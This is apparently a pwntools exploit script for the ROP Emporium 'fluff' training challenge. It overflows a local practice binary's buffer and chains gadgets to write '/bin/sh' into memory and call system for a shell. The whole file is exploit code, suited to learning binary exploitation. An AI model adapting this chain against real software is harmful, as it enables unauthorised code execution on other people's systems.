from pwn import *
context.log_level="debug"
e = ELF("./fluff")
system = p64(e.symbols["system"])
data = p64(0x00601050)

# 0x000000000040084e : mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret 
# 0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
# 0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
# 0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret
# 0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
# 0x00000000004008c3 : pop rdi ; ret

mov_r10_r11 = p64(0x000000000040084e)
xor_r11_r11 = p64(0x0000000000400822)
xor_r11_r12 = p64(0x000000000040082f)
pop_r12 = p64(0x0000000000400832)
xchg_r11_r10 = p64(0x0000000000400840)
pop_rdi = p64(0x00000000004008c3)


payload = "a"*40
# r10 = data_addr
payload += xor_r11_r11
payload += p64(1)
payload += pop_r12
payload += data
payload += xor_r11_r12
payload += data
payload += xchg_r11_r10
payload += p64(2)
# r11 = "/bin/sh\x00"
payload += xor_r11_r11
payload += p64(3)
payload += pop_r12
payload += "/bin/sh\x00"
payload += xor_r11_r12
payload += data
# mov [r10], r11
payload += mov_r10_r11
payload += p64(4)
payload += p64(0)
payload += system
payload += pop_rdi
payload += data

p = process("./fluff")
print p.recv()
raw_input()
p.sendline(payload)
p.interactive()


